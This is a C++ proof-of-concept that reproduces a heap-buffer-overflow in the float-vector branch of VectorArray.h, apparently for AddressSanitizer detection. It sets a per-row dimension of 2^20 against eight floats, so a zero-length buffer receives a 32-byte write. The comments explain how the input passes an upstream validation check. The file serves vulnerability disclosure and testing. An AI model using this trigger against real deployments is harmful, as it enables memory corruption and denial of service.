// C1 — VectorArray float-branch heap overflow (ASan detection PoC)
// Faithful reproduction of internal/core/src/common/VectorArray.h:57-70 (kFloatVector case).
// The ONLY thing replaced is FastMemcpy -> std::memcpy and the proto accessors ->
// a layout-faithful stand-in. The vulnerable arithmetic is verbatim from source.
#include <cstdint>
#include <cstring>
#include <cstdio>
#include <string>
#include <vector>

// ---- layout-faithful stand-in for VectorFieldProto (the two fields C1 touches) ----
struct FloatVectorProto { std::string bytes;                      // .data() is a byte string of floats
                          const void* data() const { return bytes.data(); }
                          size_t size() const { return bytes.size(); } };
struct VectorFieldProto { int64_t dim_field;                      // per-row proto `dim`  (attacker-controlled)
                          FloatVectorProto fv;
                          int64_t dim() const { return dim_field; }
                          const FloatVectorProto& float_vector() const { return fv; } };

// ---- verbatim from VectorArray.h:57-70, kFloatVector case ----
void VectorArray_float_branch(const VectorFieldProto& vector_field) {
    int64_t dim_ = vector_field.dim();                                             // :57
    // length_ = data size / dim
    size_t length_ = vector_field.float_vector().size() / sizeof(float) / dim_;    // :62 (size() is bytes here)
    auto data = new float[length_ * dim_];                                         // :63  buffer = (N/dim)*dim floats
    size_t bytes = vector_field.float_vector().size();                            // N floats * 4
    std::memcpy(data,                                                              // :66-69  copies ALL N floats
                vector_field.float_vector().data(),
                bytes);
    printf("[C1] dim=%lld  N=%zu floats  length_=%zu  alloc=%zu floats  memcpy=%zu bytes\n",
           (long long)dim_, bytes / sizeof(float), length_, length_ * dim_, bytes);
    delete[] data;
}

int main() {
    // Attacker request: schema_dim=4, row float data = 8 floats (8 % 4 == 0 -> passes Go gate),
    // but per-row proto dim set to 2^20.  In C++: length_ = 8 / 2^20 = 0 -> new float[0].
    VectorFieldProto req;
    req.dim_field = 1 << 20;                       // attacker's per-row dim
    std::vector<float> payload(8);                 // 8 attacker floats -> 32 bytes to write OOB
    for (int i = 0; i < 8; i++) payload[i] = 1.0f + i;
    req.fv.bytes.assign(reinterpret_cast<char*>(payload.data()), payload.size() * sizeof(float));

    VectorArray_float_branch(req);                 // -> heap-buffer-overflow WRITE of 32 bytes
    printf("[C1] returned without ASan abort (unexpected)\n");
    return 0;
}
